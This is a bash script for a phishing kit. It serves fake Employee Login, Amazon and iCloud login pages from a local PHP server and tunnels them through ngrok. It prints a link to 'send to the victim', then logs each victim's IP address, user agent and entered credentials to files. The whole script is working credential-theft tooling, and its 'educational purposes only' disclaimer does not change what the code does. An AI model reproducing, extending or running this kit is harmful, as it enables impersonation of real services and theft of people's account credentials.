#!/bin/bash

trap 'printf "\n"; stop; exit 1' 2

dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
  command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
  command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
  command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
}

menu() {
  printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Employee Login\e[0m\n"
  printf "          \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Amazon\e[0m\n"
  printf "          \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m iCloud\e[0m\n"

  read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option

  if [[ $option == 1 ]]; then
    server="employee"
    start
  elif [[ $option == 2 ]]; then
    server="amazon"
    start
  elif [[ $option == 3 ]]; then
    server="icloud"
    start
  else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    menu
  fi
}

stop() {
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi
  if [[ $checkphp == *'php'* ]]; then
    pkill -f -2 php > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1
  fi
}

banner() {
  printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
  printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by this code. ::\e[0m\n"
  printf "     \e[101m\e[1;77m::              Use for educational purposes only.          ::\e[0m\n"
  printf "\n"
  printf "     \e[101m\e[1;77m::               AA Warzone Login Page                  ::\e[0m\n"
  printf "\n"
}

start() {
  if [[ -e sites/$server/ip.txt ]]; then
    rm -rf sites/$server/ip.txt
  fi
  if [[ -e sites/$server/usernames.txt ]]; then
    rm -rf sites/$server/usernames.txt
  fi

  printf "\e[1;92m[\e[0m*\e[1;92m] Starting PHP server...\n"
  cd sites/$server && php -S 127.0.0.1:3333 -t . > /dev/null 2>&1 &
  sleep 2

  printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
  ./ngrok http 3333 > ngrok_log.txt &
  sleep 10

  link=$(grep -o "https://[0-9a-z]*\.ngrok.io" ngrok_log.txt | tail -n1)
  printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the victim:\e[0m\e[1;77m %s\e[0m\n" $link
  checkfound
}


checkfound() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for the victim to open the link...\e[0m\n"
  while true; do
    if [[ -e "sites/$server/ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
      catch_ip
    fi
    sleep 1
  done
}

catch_ip() {
  touch sites/$server/saved.usernames.txt
  ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
  ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)

  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.ip.txt\e[0m\n" $server

  cat sites/$server/ip.txt >> sites/$server/saved.ip.txt

  # Additional IP tracking functionality can be added here

  get_credentials
}

get_credentials() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials...\e[0m\n"
  while true; do
    if [[ -e "sites/$server/usernames.txt" ]]; then
      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
      sort -u sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
      rm -rf sites/$server/usernames.txt
      printf "\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
      stop
    fi
    sleep 1
  done
}

dependencies
banner
menu
